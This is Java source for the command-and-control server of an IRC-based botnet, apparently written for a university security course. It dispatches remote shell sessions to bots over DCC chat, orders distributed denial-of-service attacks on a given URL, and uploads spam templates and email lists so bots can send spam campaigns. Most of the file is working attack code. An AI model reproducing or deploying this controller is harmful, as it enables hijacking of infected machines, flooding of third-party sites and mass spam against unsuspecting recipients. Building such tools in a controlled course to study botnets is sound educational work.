import java.io.*;
import java.net.*;
import java.util.*;
import javax.mail.*;
import org.jibble.pircbot.*;

/**
 * This is the BotnetServer class, it serve as the command and control interface for the bot master.
 * There are several commands available to the user including
 * <dl>
 * 		<dt>Help</dt>
 * 			<dd> Prints out the available commands <br/>
 * 				Usage: help
 * 			</dd>
 * 		<dt>Names</dt>
 * 			<dd> Prints out the nicks of all bots running on the IRC server <br/>
 * 				Usage: names
 * 			</dd>
 * 		<dt>Remote shell</dt>
 * 			<dd> One must give the command "exit" to leave the shell again, if you must type "exit" but don't wish to leave simply append a space <br/>
 * 				Usage: shell botNick [timeout]
 * 			</dd>
 * 		<dt>Distributed Denial of Service</dt>
 * 			<dd> One can specify by nick and number of bots to have participate or simply say "all" for the first bot nick to have all bots participate  <br/>
 * 				Usage: ddos url interval duration bot [more bots]
 * 			</dd>
 * 		<dt>Spam File Upload</dt>
 * 			<dd> One can upload a template and email file with this command for later use in sending spam. The uploaded files must have the names "template.txt" or "emails.txt".
 * 				 You can specify specific bots to send the files to or you can give 'all' to send the file to all available bots. 
 * 				The template file must contain unique 'XXX', 
 * 				'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line. <br/>
 * 				Usage: spamupload templateFile emailFile bot [more bots]
 * 			</dd>
 * 		<dt>Spam</dt>
 * 			<dd> One can send spam with the XXX, YYY, and ZZZ fields in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word. 
 * 				The spam will be sent from the given address to the given recipients.
 * 				Giving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to
 * 				a random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, 
 * 				the number will not be respected if it exceeds the size of the botnet.
 * 				Usage: spam numBots xxx yyy zzz from subject recipient [more recipients]
 * 			</dd>
 * </dl>
 * 
 * @author Roy McElmurry, Robert Johnson
 */
public class BotnetServer extends PircBot {
	private static final String[] COMMANDS = {"help", "names", "list", "shell", "ddos", "spam", "lease", "killbot", "destroybotnet"};
	
	private static final String SENTINEL = "$: ";
	private static final String TERMINATION = "exit";
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "RandR";
	private static final boolean DEBUG = true;
	private static final int PORT = 6667;
	private static final int TIMEOUT = 120000;
	private Scanner input;
	private boolean inChat;
	
	public static void main(String[] args) {
		BotnetServer bn = new BotnetServer();
	}
	
	/**
	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
	 */
	public BotnetServer() {
		input = new Scanner(System.in);
		try {
			setVerbose(DEBUG);
			setName(NAME);
			setMessageDelay(0);
			
			connect(SERVER, PORT);
			
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			changeNick(NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	protected void onConnect() {
		joinChannel(CHANNEL);
		setMode(CHANNEL, "s");
	}
	
	protected void onUserList(String channel, User[] bots) {
		for (int i = 0; i < bots.length; i++) {
			System.out.println("\t" + bots[i].toString());
		}
		init();
	}
	
	protected void onChannelInfo(String channel, int userCount, String topic) {
		System.out.println("\t" + channel + " (" + userCount + ")");
	}
	
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		System.out.println("<" + sender + ">: " + message);
	}
	
	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
		if (e != null) {
			System.out.println("\tThere was a problem trasferring the file\n\t" + e.getMessage());
		} else {
			String fileName = transfer.getFile().getName();
			System.out.println("\tSuccessfully delivered " + fileName + " to " + transfer.getNick());
		}
	}
	
	/**
	 * Reads input from the user and handles the command.
	 */
	public void init() {
		System.out.print("Command: ");
		String message = input.nextLine();
		while(!message.toLowerCase().equalsIgnoreCase("q")) {
			performCommand(message);
			System.out.print("Command: ");
			message = input.nextLine();
		}
	}
	
	/** 
	 * <p>If s is a recognized command, the corresponding action is taken, 
	 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
	 * and finally if it is not a command or a private message to the channel then it is sent 
	 * as a raw message the IRC server.</p>
	 * 
	 * @param s A command/message to be interpreted
	 */
	public void performCommand(String s) {
		//Respond to a help command with a shit ton of printlns.
		if (s.toLowerCase().equalsIgnoreCase("help")) {
			printHelp();
		//Respond to a list command by listing all channels (DOESN'T WORK)
		} else if (s.toLowerCase().equalsIgnoreCase("list")) {
			listChannels();
		//Respond to a names command by getting the user on CHANNEL and printing their nicks
		} else if (s.toLowerCase().equals("names")) {
			String[] bots = getUserNames();
			for (int i = 0; i < bots.length; i++) {
				System.out.println("\t" + bots[i]);
			}
		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
			acquireOpStatus();
		//Respond to the shell command by sending commands to the specified bot and reading responses until the chat has ended
		} else if (s.toLowerCase().startsWith("shell")) {
			String[] parts = s.split(" ");
			if (parts.length >= 3) {
				engageInChat(parts[1], Integer.parseInt(parts[2]));
			} else if (parts.length >= 2) {
				engageInChat(parts[1], TIMEOUT);
			} else {
				System.out.println("\tUsage: shell botNick [timeout]");
			}
		//Respond to a ddos command by gathering the arguments and private messaging each specified bot
		} else if (s.toLowerCase().startsWith("ddos")) {
			String[] parts = s.split(" ");
			if (parts.length < 5) {
				System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
			} else {
				String[] botNames = chooseBots(parts, 4);
				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
				for (int i = 0; i < botNames.length; i++) {
					if (!botNames[i].equals(NAME)) {
						this.sendMessage(botNames[i], command);
					}
				}
			}
		//Respond to a spam command by sending over the spam template file and emails file and then initiating a spam attack
		} else if (s.toLowerCase().startsWith("spamupload")) {
			String[] parts = s.split(" ");
			if (parts.length < 4) {
				System.out.println("Usage: spamupload template emails bot [more bots]");
			} else {
				String[] botNames = chooseBots(parts, 3);
				for (int i = 0; i < botNames.length; i++) {
					if (!botNames[i].equals(NAME)) {
						dccSendFile(new File(parts[1]), botNames[i], TIMEOUT);
						dccSendFile(new File(parts[2]), botNames[i], TIMEOUT);
					}
				}
			}
		//Respond to spam command by selecting numbots bots and issuing the command	
		} else if (s.toLowerCase().startsWith("spam")) {
			String[] parts = s.split(" ");
			if (parts.length < 8) {
				System.out.println("Usage: spam numBots xxx yyy zzz from subject recipient [more recipients]");
			} else {
				int numBots = Integer.parseInt(parts[1]);
				String[] bots = getUserNames();
				if (bots.length > numBots) {
					bots = Arrays.copyOfRange(bots, 0, numBots);
				}
				String command = parts[0];
				for (int i = 2; i < parts.length; i++) {
					command += parts[i];
				}
				for (int i = 0; i < bots.length; i++) {
					sendMessage(bots[i], command);
				}
			}
		//Respond to a message beginning with a colon by messaging the CHANNEL
		} else if (s.startsWith(":")) {
			sendMessage(CHANNEL, s.substring(1));
		//Respond to all other messages by sending the message raw to the IRC server
		} else if (!s.isEmpty()) {
			sendRawLine(s);
		}
	}
	
	public String[] chooseBots(String[] arr, int index) {
		if (arr[index].equalsIgnoreCase("all")) {
			return getUserNames();
		} else {
			return Arrays.copyOfRange(arr, index, arr.length);
		}
	}
	
	public String[] getUserNames() {
		User[] bots = getUsers(CHANNEL);
		String[] names = new String[bots.length];
		for (int i = 0; i < bots.length; i++) {
			names[i] = bots[i].getNick();
		}
		return names;
	}
	
	/**
	 * Gives the CC bot operator status and then removes it from all other bots.
	 */
	private void acquireOpStatus() {
		op(CHANNEL, NAME);
		User[] bots = getUsers(CHANNEL);
		for (int i = 0; i < bots.length; i++) {
			System.out.println(bots[i].getNick());
			if (!bots[i].getNick().equals(NAME)) {
				deOp(CHANNEL, bots[i].toString());
			}
		}
		op(CHANNEL, NAME);
	}
	
	/**
	 * Prints out a help message that describes available functionality and commands.
	 */
	private void printHelp() {
		System.out.println("\tHelp");
		System.out.println("\t\tPrints out the available commands");
		System.out.println("\t\tUsage: help");
		System.out.println("\tNames");
		System.out.println("\t\tPrints out the nicks of all bots running on the IRC server");
		System.out.println("\t\tUsage: names");
		System.out.println("\tRemote shell");
		System.out.println("\t\tOne must give the command \"exit\" to leave the shell again, if you must type \"exit\" but don't wish to leave simply append a space");
		System.out.println("\t\tUsage: shell botNick [timeout]");
		System.out.println("\tDistributed Denial of Service");
		System.out.println("\t\tOne can specify by nick and number of bots to have participate or simply say \"all\" for the first bot nick to have all bots participate");
		System.out.println("\t\tddos url interval duration bot [more bots]");
		System.out.println("\tSpam File Upload");
		System.out.println("\t\tOne can upload a template and email file with this command for later use in sending spam. The uploaded files must have the names \"template.txt\" or \"emails.txt\".");
		System.out.println("\t\tYou can specify specific bots to send the files to or you can give 'all' to send the file to all available bots.");
		System.out.println("\t\tThe template file must contain unique 'XXX', ");
		System.out.println("\t\t'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line.");
		System.out.println("\t\tUsage: spamupload templateFile emailFile bot [more bots]");
		System.out.println("\tSpam");
		System.out.println("\t\tOne can send spam with the XXX, YYY, and ZZZ fields in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word."); 
		System.out.println("\t\tThe spam will be sent from the given address to the given recipients.");
		System.out.println("\t\tGiving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to");
		System.out.println("\t\ta random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, ");
		System.out.println("\t\tthe number will not be respected if it exceeds the size of the botnet.");
		System.out.println("\t\tUsage: spam numBots xxx yyy zzz from subject recipient [more recipients]");
	}
	
	/**
	 * Establishes a DCC chat with the specified bot for the purpose of creating a remote shell.
	 * Feeds commands to the bot and prints out responses.
	 */
	private void engageInChat(String botNick, int timeout) {
		DccChat chat = dccSendChatRequest(botNick, timeout);
		if (chat == null) {
			System.out.println("The chat request was rejected.");
		} else {
			Scanner input = new Scanner(System.in);
			Scanner shellout = new Scanner(chat.getBufferedReader());
			
			try {
				System.out.print(shellout.nextLine());
				
				String command = input.nextLine();
				while (!command.equalsIgnoreCase(TERMINATION)) {
					chat.sendLine(command);
					String response = shellout.nextLine();
					while (!response.endsWith(SENTINEL)) {
						System.out.println("\t" + response);
						response = shellout.nextLine();
					}
					System.out.print(response);
					command = input.nextLine();
				}
				chat.sendLine(command);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
